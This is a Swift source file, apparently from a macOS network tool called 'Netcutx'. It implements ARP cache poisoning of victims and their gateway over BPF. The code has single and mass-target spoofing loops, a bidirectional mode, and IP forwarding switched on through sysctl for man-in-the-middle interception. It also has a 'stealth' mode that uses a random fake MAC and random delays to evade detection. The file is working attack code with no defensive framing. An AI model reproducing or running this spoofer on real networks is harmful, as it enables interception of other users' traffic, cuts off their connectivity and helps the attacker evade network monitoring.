import Foundation
import Darwin

var _stopFlag: Int32 = 0

private let _sigHandler: @convention(c) (Int32) -> Void = { _ in
    _stopFlag = 1
}

func setupSignal() {
    _stopFlag = 0
    var sa = sigaction()
    sigemptyset(&sa.sa_mask)
    sa.__sigaction_u.__sa_handler = _sigHandler
    sa.sa_flags = 0
    sigaction(SIGINT, &sa, nil)
    sigaction(SIGTERM, &sa, nil)
}

func requestSpooferStop() { _stopFlag = 1 }
func resetSpooferStop()   { _stopFlag = 0 }

struct SpooferConfig {
    let interface: String
    let victimIP: String
    let gatewayIP: String
    let ourMAC: MACAddr
    let ourIP: String
    let victimMAC: MACAddr
    let gatewayMAC: MACAddr
    let interval: TimeInterval
    let bidirectional: Bool
    let forwardTraffic: Bool
}

func startSpoofing(config: SpooferConfig) throws {
    let bpf = try NetcutxBPF(interface: config.interface)
    defer { bpf.close() }

    setupSignal()

    var forwardingEnabled = false
    if config.forwardTraffic {
        forwardingEnabled = setIPForwarding(true)
    }

    print("Spoofing \(config.victimIP) (\(macToString(config.victimMAC)))")
    print("  gateway: \(config.gatewayIP) (\(macToString(config.gatewayMAC)))")
    print("  our MAC: \(macToString(config.ourMAC))")
    print("  interval: \(config.interval)s")
    if config.bidirectional { print("  mode: bidirectional") }
    if config.forwardTraffic { print("  IP forwarding: on") }
    print("Press Ctrl+C to stop and restore")
    print("")

    var count = 0
    while _stopFlag == 0 {
        try bpf.send(frame: Data(ARPFrame.buildReply(
            srcMAC: config.ourMAC, srcIP: config.gatewayIP,
            dstMAC: config.victimMAC, dstIP: config.victimIP
        ).bytes))

        try bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
            srcMAC: config.ourMAC, srcIP: config.gatewayIP,
            victimMAC: config.victimMAC, victimIP: config.victimIP
        ).bytes))

        let apPoison = ARPFrame.buildAPPoison(
            srcMAC: config.ourMAC, srcIP: config.victimIP,
            targetMAC: config.gatewayMAC, targetIP: config.gatewayIP
        )
        try bpf.send(frame: Data(apPoison.bytes))

        // Broadcast "victimIP → ourMAC" — poisons gateway even if it filters unicast ARP
        try bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
            srcMAC: config.ourMAC, srcIP: config.victimIP,
            victimMAC: config.gatewayMAC, victimIP: config.gatewayIP
        ).bytes))

        count += 1

        if config.bidirectional {
            try bpf.send(frame: Data(ARPFrame.buildAPPoison(
                srcMAC: config.ourMAC, srcIP: config.gatewayIP,
                targetMAC: config.gatewayMAC, targetIP: config.victimIP
            ).bytes))

            try bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: config.ourMAC, srcIP: config.victimIP,
                victimMAC: config.gatewayMAC, victimIP: config.gatewayIP
            ).bytes))
            count += 1
        }

        print("Sent spoof #\(count)", terminator: "")
        if config.bidirectional { print(" (bidirectional)", terminator: "") }
        print("")

        let start = Date()
        while Date().timeIntervalSince(start) < config.interval {
            if _stopFlag != 0 { break }
            Thread.sleep(forTimeInterval: 0.05)
        }
    }

    print("\nRestoring ARP tables...")
    sendRestore(bpf: bpf, config: config)
    print("ARP tables restored")

    if forwardingEnabled {
        _ = setIPForwarding(false)
    }
}

func startMassSpoofing(configs: [SpooferConfig]) throws {
    guard !configs.isEmpty else { return }
    let first = configs[0]

    let bpf = try NetcutxBPF(interface: first.interface)
    defer { bpf.close() }

    setupSignal()

    var forwardingEnabled = false
    if first.forwardTraffic {
        forwardingEnabled = setIPForwarding(true)
    }

    if configs.count == 1 {
        let cfg = configs[0]
        print("Spoofing \(cfg.victimIP) (\(macToString(cfg.victimMAC)))")
    } else {
        print("Mass spoofing \(configs.count) targets:")
        for cfg in configs {
            print("  - \(cfg.victimIP) (\(macToString(cfg.victimMAC)))")
        }
    }
    print("  gateway: \(first.gatewayIP) (\(macToString(first.gatewayMAC)))")
    print("  our MAC: \(macToString(first.ourMAC))")
    print("  interval: \(first.interval)s")
    print("Press Ctrl+C to stop and restore")
    print("")

    var round = 0
    while _stopFlag == 0 {
        round += 1
        for cfg in configs {
            try bpf.send(frame: Data(ARPFrame.buildReply(
                srcMAC: cfg.ourMAC, srcIP: cfg.gatewayIP,
                dstMAC: cfg.victimMAC, dstIP: cfg.victimIP
            ).bytes))

            try bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: cfg.ourMAC, srcIP: cfg.gatewayIP,
                victimMAC: cfg.victimMAC, victimIP: cfg.victimIP
            ).bytes))

            try bpf.send(frame: Data(ARPFrame.buildAPPoison(
                srcMAC: cfg.ourMAC, srcIP: cfg.victimIP,
                targetMAC: cfg.gatewayMAC, targetIP: cfg.gatewayIP
            ).bytes))

            // Broadcast "victimIP → ourMAC" — poisons gateway even if it filters unicast ARP
            try bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: cfg.ourMAC, srcIP: cfg.victimIP,
                victimMAC: cfg.gatewayMAC, victimIP: cfg.gatewayIP
            ).bytes))

            if cfg.bidirectional {
                try bpf.send(frame: Data(ARPFrame.buildAPPoison(
                    srcMAC: cfg.ourMAC, srcIP: cfg.gatewayIP,
                    targetMAC: cfg.gatewayMAC, targetIP: cfg.victimIP
                ).bytes))
                try bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                    srcMAC: cfg.ourMAC, srcIP: cfg.victimIP,
                    victimMAC: cfg.gatewayMAC, victimIP: cfg.gatewayIP
                ).bytes))
            }
        }

        if configs.count == 1 {
            print("Sent spoof #\(round)")
        } else {
            print("Round #\(round) — spoofed \(configs.count) targets")
        }

        let start = Date()
        while Date().timeIntervalSince(start) < first.interval {
            if _stopFlag != 0 { break }
            Thread.sleep(forTimeInterval: 0.05)
        }
    }

    print("\nRestoring ARP tables...")
    for cfg in configs {
        sendRestore(bpf: bpf, config: cfg)
    }
    print("ARP tables restored")

    if forwardingEnabled {
        _ = setIPForwarding(false)
    }
}

func sendRestore(bpf: NetcutxBPF, config: SpooferConfig) {
    for _ in 0..<3 {
        try? bpf.send(frame: Data(ARPFrame.buildReply(
            srcMAC: config.gatewayMAC, srcIP: config.gatewayIP,
            dstMAC: config.victimMAC, dstIP: config.victimIP
        ).bytes))
        try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
            srcMAC: config.victimMAC, srcIP: config.victimIP,
            targetMAC: config.gatewayMAC, targetIP: config.gatewayIP
        ).bytes))
        Thread.sleep(forTimeInterval: 0.1)
    }
    if config.bidirectional {
        for _ in 0..<3 {
            try? bpf.send(frame: Data(ARPFrame.buildReply(
                srcMAC: config.victimMAC, srcIP: config.victimIP,
                dstMAC: config.gatewayMAC, dstIP: config.gatewayIP
            ).bytes))
            Thread.sleep(forTimeInterval: 0.1)
        }
    }
}

func stealthSpoofLoop(bpf: NetcutxBPF, targetIP: String, targetMAC: MACAddr, gwIP: String, gwMAC: MACAddr) {
    let fakeMAC = randomMAC()
    var count = 0
    while _stopFlag == 0 {
        try? bpf.send(frame: Data(ARPFrame.buildReply(
            srcMAC: fakeMAC, srcIP: gwIP, dstMAC: targetMAC, dstIP: targetIP).bytes))
        try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
            srcMAC: fakeMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gwIP).bytes))
        count += 1
        let sleepTime = Double.random(in: 15...30)
        let start = Date()
        while Date().timeIntervalSince(start) < sleepTime {
            if _stopFlag != 0 { break }
            Thread.sleep(forTimeInterval: 0.1)
        }
    }
}

func stealthRestoreARP(bpf: NetcutxBPF, targetMAC: MACAddr, targetIP: String, gwMAC: MACAddr, gwIP: String) {
    for _ in 0..<3 {
        try? bpf.send(frame: Data(ARPFrame.buildReply(
            srcMAC: gwMAC, srcIP: gwIP, dstMAC: targetMAC, dstIP: targetIP).bytes))
        try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
            srcMAC: targetMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gwIP).bytes))
        Thread.sleep(forTimeInterval: 0.1)
    }
}

private func setIPForwarding(_ enable: Bool) -> Bool {
    let value = enable ? "1" : "0"
    let task = Process()
    task.executableURL = URL(fileURLWithPath: "/usr/sbin/sysctl")
    task.arguments = ["-w", "net.inet.ip.forwarding=\(value)"]
    do {
        try task.run()
        task.waitUntilExit()
        return task.terminationStatus == 0
    } catch {
        return false
    }
}
